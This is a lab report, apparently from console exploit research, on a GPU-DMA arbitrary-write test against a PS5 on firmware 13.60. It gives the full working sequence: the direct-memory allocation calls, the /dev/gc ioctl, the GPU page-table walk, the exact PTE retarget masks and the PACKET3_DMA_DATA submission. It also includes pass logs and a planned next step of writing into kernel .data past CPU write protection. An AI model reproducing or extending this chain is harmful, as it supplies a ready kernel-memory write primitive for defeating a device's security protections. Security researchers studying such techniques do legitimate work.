# GPU-DMA WRITE TEST — retarget (arbitrary write) PASSES on 13.60

**Date:** 2026-10-06
**Console:** 10.0.0.x (13.60), live
**Payload:** `scratch/ps5/probe76/main.c` → `gpuwrite.elf` (ps5-payload-sdk v0.43)
**Result:** ✅ **RETARGET PASS** — sentinel `0xDEADBEEFCAFEBABE` landed at the retargeted
destination, both read and write directions, **no panic**.

---

## 1. Outcome

| Test | What | Result |
|---|---|---|
| T1a | `mprotect` alone (drop `PROT_GPU_WRITE`, re-enable) on garlic victim, no retarget, no DMA | **PASS** (both calls returned 0, no panic) |
| T1b | Retarget victim leaf → staging phys, **without mprotect**, DMA `src=victim → dst=cmd` | **PASS** (`got=0xDEADBEEFCAFEBABE`) |
| T2  | Retarget victim leaf → staging phys, **without mprotect**, DMA `src=cmd → dst=victim` | **PASS** (sentinel landed in staging) |

The write direction (T2) is the actual arbitrary-write primitive: the GPU wrote the
sentinel **through the retargeted victim PTE** into the staging buffer's physical page.

### Run log (authoritative, from `/data/kex_gpuwrite.txt`)
```
victim_va=0x200c00000 staging_va=0x200e00000 cmd_va=0x201000000
dev vmid=6 (39 leaves)
victim leaf: gva=0x200c00000 phys=0x47bc00000 pte_pa=0x13e69030 raw=0x004000047bc004f7 is_2m=1
phys_mask=0x0000ffffffe00000 target(staging)_phys=0x47be00000
T1a: mprotect drop (remove PROT_GPU_WRITE)...
T1a: mprotect drop returned 0
T1a: mprotect restore (re-add PROT_GPU_WRITE)...
T1a: mprotect restore returned 0
T1a PASS (mprotect alone did not panic)
T1b: pte_pa=0x13e69030 old=0x004000047bc004f7 new=0x004000047be004f7 target_phys=0x47be00000
T1b: kernel_setlong done, readback=0x004000047be004f7
T1b: ioctl=0 got=0xdeadbeefcafebabe expect=0xdeadbeefcafebabe (restored readback=0x004000047bc004f7)
PASS
T2: pte_pa=0x13e69030 old=0x004000047bc004f7 new=0x004000047be004f7 target_phys=0x47be00000
T2: kernel_setlong done, readback=0x004000047be004f7
T2: ioctl=0 got=0xdeadbeefcafebabe expect=0xdeadbeefcafebabe (restored readback=0x004000047bc004f7)
PASS
done
```

---

## 2. Root cause of the prior T1 panic

The prior T1 did `mprotect drop → kernel_setlong(retarget) → mprotect restore → DMA` and
panicked. Two candidate culprits were isolated; **only one was real**:

1. **`mprotect` — NOT the culprit.** T1a (drop + re-enable alone) passed cleanly.
2. **The 2 MB physical-field mask — the culprit.** The old code had
   `#define GPU_ADDR_2M_MASK 0x0000FFFFFFFFFFE00000ull`. That literal is **80 bits**
   (16 hex digits after `0x0000` is 20 hex digits total), so the C compiler truncated it
   to the low 64 bits `0xFFFFFFFFFFE00000` — which clears **bits 21–63**, including the
   **`IS_PTE` flag (bit 54)** and all high flags (bits 48–63).

   The retarget therefore produced an entry with `IS_PTE=0`, so the GPU reinterpreted the
   (still `VALID`) 2 MB leaf as a **pointer to a lower-level page table** at a garbage
   physical address and faulted → KP.

   Correct 2 MB mask (bits 21–47) is `0x0000FFFFFFE00000`. With it, the retarget
   `new = 0x004000047be004f7` keeps `IS_PTE=1` (bit 54) and only swaps the physical page
   (`0x47bc00000` → `0x47be00000`).

---

## 3. The working retarget sequence (13.60)

The `/dev/gc` device opens its own gvmspace — the **"dev" vmid** (observed **vmid 6**).
In that vmid the garlic direct-memory buffers are mapped at their **CPU VA** (not the
graphics garlic VA `0xc80000000`, which is the *other* vmid, vmid 2). DMA must be
addressed with **CPU VAs** in the dev vmid.

1. **Allocate** three 2 MiB garlic buffers via
   `sceKernelAllocateDirectMemory(0, 0x400000000, 0x200000, 0x200000, 0xb /*garlic*/, &off)`
   and map with `sceKernelMapDirectMemory(&va, SZ, PROT_READ|PROT_WRITE|PROT_GPU_READ|PROT_GPU_WRITE, MAP_NO_COALESCE, off, SZ)`.
   (victim, staging, cmd — contiguous in phys, 2 MiB apart.)
2. **Open `/dev/gc`** (fallback `/dev/gc0`) **before** using it; find the dev vmid
   (scan `gvmspace[vm].page_dir_va` for `vm in 0..15`, pick the one whose leaves contain
   `victim_gva == victim_va`).
3. **Walk the GPU page tree** for that vmid (PDB2/PML4 → PDB1/PDPT → PDB0/PD → PDE/PTB),
   find the victim leaf (a **2 MiB leaf** here: `IS_PTE` bit 54 set). Record `raw` and
   `pte_pa` (physical address of the PDE entry: `pd_pa + i2*8`).
4. **Retarget** (replace only the physical field, preserve every flag bit):
   - 2 MiB leaf: `new = (old & ~0x0000FFFFFFE00000) | (target_phys & 0x0000FFFFFFE00000)`
   - 8 KiB leaf: `new = (old & ~0x0000FFFFFFFFE000) | (target_phys & 0x0000FFFFFFFFE000)`
   - `target_phys` must be page-aligned to the leaf size (2 MiB here). The flag bits
     include `VALID` (0), low bits 1–12 (`0x4f7`), and high bits (bit 54 `IS_PTE`, and for
     the *garlic-vmid* leaf also bit 50) — all preserved by the mask.
5. **Write the PTE**: `kernel_setlong(dmap + pte_pa, new)` where `dmap = KERNEL_ADDRESS_DMAP_BASE`.
6. **Build + submit** `PACKET3_DMA_DATA` (opcode `0x50`) via
   `ioctl(gc, 0xC0108102, {pipe_id=0, count=1, cmd_buf_ptr=desc_va})`:
   - write: `src=transfer_gva, dst=victim_gva (+offset)` → GPU writes through the
     retargeted PTE into `target_phys`.
   - read:  `src=victim_gva (+offset), dst=transfer_gva`.
   - packet at `cmd[0]`, 16-byte descriptor at `cmd[0x100]`; `usleep(500ms)` for the fence.
7. **Restore** the PTE: `kernel_setlong(dmap + pte_pa, old_raw)`.

**No `mprotect` is needed** — the retarget takes effect on the next DMA submission without
a TLB flush (the victim VA is translated fresh; `mprotect` drop+restore is harmless but
unnecessary on 13.60 for this path).

### Exact values from the PASS run
- victim leaf: `gva=0x200c00000 phys=0x47bc00000 pte_pa=0x13e69030 raw=0x004000047bc004f7`
- retarget to staging: `new=0x004000047be004f7` (phys `0x47be00000`)
- readback after `kernel_setlong`: `0x004000047be004f7` (write landed)
- restore readback: `0x004000047bc004f7` (restore landed)

---

## 4. Next step (not yet run)

Retarget the victim leaf to an **arbitrary kernel `.data` physical page** (target = a
safe/padding field in `kdata`) instead of staging, then DMA-write the sentinel through it.
Same sequence as §3 with `target_phys = kernel_data_pa`; the CPU-side `.data` write
protection does not gate the GPU DMA path. Requires the 13.60 kASLR base + a chosen safe
`.data` offset (a separate task).
